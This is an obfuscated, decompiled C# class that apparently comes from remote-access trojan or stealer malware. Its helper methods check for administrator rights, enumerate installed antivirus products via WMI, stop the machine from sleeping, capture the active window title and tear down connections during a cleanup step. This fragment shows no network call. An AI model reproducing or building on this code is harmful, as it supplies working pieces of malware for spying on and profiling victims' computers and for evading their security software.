using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Security.Principal;
using System.Text;
using TWpTmyPaElwafc;
using XQTTiTqzQXXI;

namespace ktQiwKnbqDow;

public static class oEzmcrieBfuvH
{
	public static bool qkksKQptGloEOQ()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void rriEWDblrV()
	{
		try
		{
			if (Convert.ToBoolean(OOyHmWyLirxV.WJhVBImPnj) && qkksKQptGloEOQ())
			{
				EwUgKCTqWjum.JazBeBSoGpfhDl();
			}
			HxRxFLpyqtetS.DPBSsntbQdpLv();
			pWNWCMPowAyznM.FnslnmdlfCOFx?.Close();
			pWNWCMPowAyznM.laBUOXnieOGoz?.Close();
		}
		catch
		{
		}
	}

	public static string IvTSMVjJHgPneD()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				List<string> list = new List<string>();
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						list.Add(current.get_Item("displayName").ToString());
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (list.Count == 0)
				{
					return "N/A";
				}
				return string.Join(", ", list.ToArray());
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
			return "N/A";
		}
	}

	public static ImageCodecInfo TRNyOcRoqvMqQ(ImageFormat OkjuJIlJmAAJ)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < imageDecoders.Length)
			{
				val = imageDecoders[num];
				if (val.get_FormatID() == OkjuJIlJmAAJ.get_Guid())
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return val;
	}

	public static void jxSDeHAhicH()
	{
		try
		{
			jnKCjbUoiPrfOm.SetThreadExecutionState((jnKCjbUoiPrfOm.CbJjSlstirhnJU)2147483651u);
		}
		catch
		{
		}
	}

	public static string oWJPqhLtncf()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (jnKCjbUoiPrfOm.GetWindowText(jnKCjbUoiPrfOm.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
